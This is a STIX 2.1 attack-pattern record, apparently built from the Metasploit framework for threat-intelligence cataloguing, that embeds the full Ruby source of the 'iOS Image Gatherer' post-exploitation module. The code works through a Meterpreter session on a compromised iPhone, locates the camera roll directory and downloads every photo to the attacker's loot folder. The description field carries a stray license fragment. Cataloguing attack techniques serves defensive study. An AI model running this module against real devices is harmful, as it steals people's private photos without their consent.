{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--444d317b-d119-4a9e-84dc-9a24999aca4a",
    "created": "2024-08-14T16:33:00.212873Z",
    "modified": "2024-08-14T16:33:00.212877Z",
    "name": "iOS Image Gatherer",
    "description": " This module collects images from iPhones. Module was tested on iOS 10.3.3 on an iPhone 5.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/apple_ios/gather/ios_image_gather.rb",
            "external_id": "ios_image_gather.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'iOS Image Gatherer',\n        'Description' => %q{\n          This module collects images from iPhones.\n          Module was tested on iOS 10.3.3 on an iPhone 5.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Shelby Pace' ], # Metasploit Module\n        'Platform' => [ 'apple_ios' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def enum_img(f_path)\n    path = File.join(Msf::Config.loot_directory, Rex::Text.rand_text_alpha(6))\n    local_path = File.expand_path(path)\n\n    ios_imgs = dir(f_path)\n    print_status(\"Directory for iOS images: #{local_path}\")\n\n    opts = { 'block_size' => 262144 }\n    ios_imgs.each do |img|\n      print_status(\"Downloading image: #{img}\")\n      client.fs.file.download_file(\"#{local_path}/#{img}\", \"#{f_path}/#{img}\", opts)\n    rescue StandardError\n      print_error(\"#{img} could not be downloaded\")\n    end\n  end\n\n  def run\n    img_path = '/private/var/mobile/Media/DCIM/100APPLE'\n    unless directory?(img_path)\n      fail_with(Failure::NotFound, 'Could not find the default image file path')\n    end\n    print_good('Image path found. Will begin searching for images...')\n\n    enum_img(img_path)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'apple_ios' ]"
    ]
}